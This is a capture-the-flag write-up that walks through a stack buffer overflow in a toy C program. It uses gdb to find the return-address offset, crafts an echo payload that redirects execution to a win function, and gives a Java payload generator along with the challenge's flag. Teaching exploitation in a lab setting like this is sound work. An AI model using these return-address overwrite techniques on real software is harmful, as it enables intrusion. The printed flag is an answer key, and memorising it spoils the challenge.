This is the long version of this writeup. The short version is in the file ectf20p19-short.md

## Problem Description
### DMOJ Capture The Flag '20 B3 - Classic Buffer Overflow
Classic buffer overflow, should be easy, right? To make this even more easier, we're printing the address of the function you're supposed to call.

[main.c](https://static.dmoj.ca/data/ctf/ectf20/3a94daa70dec9724331681ac2d16f3b6-main.c) `3a94daa70dec9724331681ac2d16f3b6` `437B`<br>
[main](https://static.dmoj.ca/data/ctf/ectf20/98972d672b0bcd184c0c6769bb083863-main) `98972d672b0bcd184c0c6769bb083863` `15K`

The judge will run `main.c`. You must interact with the judge with a solution through the standard input and output streams. Anything the judge outputs will be in your standard input stream, and anything you output to standard output will be forwarded to the judge as input. If your solution successfully causes the judge to print the flag to its standard error stream, you will receive AC. Otherwise, you will receive WA. Note that at no point during the judging will your program receive the flag. Additionally, the judge does not need to exit with an exit code of 0. It can exit with anything.

## Solving Process
First we should check if this is 32-bit or 64-bit, as buffer overflow attacks differ between these two. I'm pretty sure it is 64-bit but it's best to check anyways. `$ file 98972d672b0bcd184c0c6769bb083863-main` shows that it is indeed x86-64. Now let's take a look at main.c.

The first line in main, `printf("%p\n", win);`, prints the memory location of win, the program we want to call.<br>
The next line, `fflush(stdout)` simple flushes stdout, and has no impact on the program.<br>
The third line calls vuln, so let's take a look at that.

In vuln, we create a string buffer with size 100, and read from stdin, taking the input and putting it in buf. After that, it prints the contents of buf to stdout, and returns.

To print the flag, it's suggested to us that we need to somehow get to win. There is seemingly no opportunity to inject and execute code, so the next possible option is to change the value of something important.

Before we figure that out, let's identify the vulnerability. `gets(buf)` is incredibly dangerous, because it doesn't check if the user input is longer than the buffer. If a user inputted a string 40 characters long, no undefined behavious would happen. However, if the user inputted a string with length 150, gets would just shove all 150 characters into buf, overwriting 50 bytes in memory.

Let's talk about what we need to do to exploit this now. How does the program know we should return to main after vuln is over? In 64-bit binaries, we use a register (sort of like a temporary variable of sorts) called $rbp. This register is usually located at a memory address higher than variables inside the function, so by overflowing buf, we could overwrite the value of $rbp.

![Example of buffer overflowing](https://github.com/jdabtieu/competitive-programming/raw/master/DMOJ%20CTF/ectf20p19/src/ectf20p19.png)<br>
In this image, let's pretend the second row is the memory and the first row are labels. The first three cells in this image correspond to buf, which should go from buf\[0\] to buf\[99\]. But if you were to access buf[100], you would get the contents of the next byte in memory. We can also overwrite those bytes, as shown in the example. By writing textgoeshere at the 3rd last byte in buf, we overwrite 9 bytes in memory, up to buf[108]. It could be possible that $rbp was located in the highlighted bytes, in which one of the bytes would have been overwritten.

We are not too concerned about $rbp though. What we actually want to change, is the eight bytes immediately following $rbp. Those eight bytes tell the computer where to return to, after it's done executing vuln.

Now, we just need to figure out where $rbp is (to figure out where the return address is), write the address of win there, and we should get the flag. To help with this, we will use gdb. Also, we will recompile the binary to make this easier.

```
$ mv 3a94daa70dec9724331681ac2d16f3b6-main.c main.c
$ gcc -fno-stack-protector -g main.c -o main
```

As you can see, gcc points out that the `gets` function is dangerous and should not be used. I used the flag `fno-stack-protector` so that the compiler doesn't insert checks protecting against buffer overflow attacks, and `g` to add additional debugging information for gdb. Let's run gdb now using `gdb main`.

I'm going to put a breakpoint at line 26 to determine how far $rbp, and subsequently, the return address, is from the end of buf.<br>`(gdb) b 26`

Now let's run the program and as input, type in 100 As. This way, we will be able to find where buf ends, and then calculate how many bytes away from the return address it is.<br>`(gdb) r`

In my instance of GDB, the address of win is going to be 0x5555555548aa. This might differ for you. As stated above, I'm going to enter 100 As as the input.

Now that thet program has reached the breakpoint, let's find the address of $rbp. Once again, the address you get might be different than the ones i got.<br>`(gdb) x/16xw $rbp`

```
0x7fffffffe5e0: 0xffffe5f0      0x00007fff      0x55554976      0x00005555
0x7fffffffe5f0: 0x55554980      0x00005555      0xf7a05b97      0x00007fff
0x7fffffffe600: 0x00000001      0x00000000      0xffffe6d8      0x00007fff
0x7fffffffe610: 0x00008000      0x00000001      0x55554941      0x00005555
```

RBP for me is located at 0x7fffffffe5e0 to 0x7ffffffffe5e7 (the first two blocks). The return address is the two blocks right after that. Keep in mind that computers store integers in little-endian, so if they stored base-10 integers for example, 1234 for us would be stored as 4321 in memory. Because of this, to get the return address, we should read the rightmost block first. The return address is 0x0000555555554976. Since we haven't tampered with this address yet, we should find that it maps to the instruction in main just after calling vuln. Let's verify this by running `(gdb) disass main`.

```
Dump of assembler code for function main:
   0x0000555555554941 <+0>:     push   %rbp
   0x0000555555554942 <+1>:     mov    %rsp,%rbp
   0x0000555555554945 <+4>:     lea    -0xa2(%rip),%rsi        # 0x5555555548aa <win>
   0x000055555555494c <+11>:    lea    0xd2(%rip),%rdi        # 0x555555554a25
   0x0000555555554953 <+18>:    mov    $0x0,%eax
   0x0000555555554958 <+23>:    callq  0x555555554720 <printf@plt>
   0x000055555555495d <+28>:    mov    0x2006bc(%rip),%rax        # 0x555555755020 <stdout@@GLIBC_2.2.5>
   0x0000555555554964 <+35>:    mov    %rax,%rdi
   0x0000555555554967 <+38>:    callq  0x555555554760 <fflush@plt>
   0x000055555555496c <+43>:    mov    $0x0,%eax
---Type <return> to continue, or q <return> to quit---
   0x0000555555554971 <+48>:    callq  0x555555554919 <vuln>
   0x0000555555554976 <+53>:    mov    $0x0,%eax
   0x000055555555497b <+58>:    pop    %rbp
   0x000055555555497c <+59>:    retq   
End of assembler dump.
```
Notice where we call (callq) vuln. `0x0000555555554971 <+48>:    callq  0x555555554919 <vuln>`<br>
Sure enough, the instruction right after this, `mov $0x0,%eax` has a memory address of `0x0000555555554976`.

So essentially, if we change the return address from 0x0000555555554976 to the address of win instead, we would jump to win instead of going back to main.

Now let's finish figuring out how far it is from the end of buf.<br>`(gdb) x/32xw $rsp`

$rsp is another register like $rbp, except it's located before buf, so we can actually see buf by finding $rsp.

```
0x7fffffffe570: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe580: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe590: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe5a0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe5b0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe5c0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe5d0: 0x41414141      0x00005500      0x00000000      0x00000000
0x7fffffffe5e0: 0xffffe5f0      0x00007fff      0x55554976      0x00005555
```

Note all the 0x41414141s. 41 in hex is actually the character A. If you count the number of 41s, you will get that there are exactly 100 of these. We can also see $rbp and the return address, they are on the last line! Simply counting the characters, we need to write another 12 characters before reaching $rbp. Then, we need to write over $rbp (8 bytes) before we get to the return address. Adding those up, we now know that we need to print 120 filler characters, followed by the address of win to get to win.

Remember how computers store numbers backwards? We also need to input the address backwards. So 0x5555555548aa should actually be printed in the order aa 48 55 55 55 55 00 00 (every two numbers/letters is 1 byte). Remember to add two 00s if needed.

Just to vertify that this works, let's craft an input with 120 As, followed by aa 48 55 55 55 55 00 00 as characters. Once again, this is the memory address for me, yours might differ. Replace this address with what you have.

I'm going to run this command in a new terminal window to craft an input for the current program running in GDB.<br>
`$ echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xaa\x48\x55\x55\x55\x55\x00\x00" > input`

The -e tells bash we are inserting hex values (\x{your hex here}) which you can see as \xaa\x48.... Then, we redirect the output of this command to a file called input.

Going back to the original window with gdb, I'm now going to run `(gdb) r < input` which tells it to run the program, using the file `input` as input. If gdb prompts you to start it from the beginning, type in y. 

Now that it's reached the breakpoint, let's check the value of the return address, using `(gdb) x/16xw $rbp`
```
0x7fffffffe5e0: 0x41414141      0x41414141      0x555548aa      0x00005555
0x7fffffffe5f0: 0x55554900      0x00005555      0xf7a05b97      0x00007fff
0x7fffffffe600: 0x00000001      0x00000000      0xffffe6d8      0x00007fff
0x7fffffffe610: 0x00008000      0x00000001      0x55554941      0x00005555
```

Alright, $rbp is now filled with 8 As. The two blocks after that, the return address, now contains the address of win (yours might vary), 0x00005555555548aa. We should be good to go.<br>
`(gdb) c`

It outputs `Failed to open flag file`, which means we successfully got into win.

Now it's just a matter of creating a script that can craft such an input for any address, not just 0x5555555548aa.

This is the script I used:

```java
import java.io.*;
import java.util.*;

public class Main {
    public static void main(String[] args) {
        String addr = new Scanner(System.in).next().substring(2);
        System.out.print("00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000");
        for (int i = addr.length() / 2; i > 0; i--) {
            System.out.print((char) Integer.parseInt(addr.substring(i * 2 - 2, i * 2), 16));
        }
        for (int i = 8; i > addr.length() / 2; i--) {
            System.out.print((char) 0);
        }
        System.out.println();
    }
}
```

I only print 119 0s as opposed to 120 because for some reason Java inserts 0xc2 between the 0s and the address, so 0xc2 is the 120th character.

Analysis of my script:
1. Get the address as a String, and remove the first 2 characters (those are 0x)
2. Print 119 0s
3. Somewhere between steps 2 and 4, a 0xc2 is inserted. I wasn't too worried about it, so I just removed a 0 from the long string of 0s.
4. Print the memory address in reverse order, by parsing converting from hex string (2 characters at a time) to integer, to character.
5. Print padding 0s at the end, if needed.
6. Print a newline

## Flag
`ctf{1ove_c411ing_r4ndom_functions_84}`
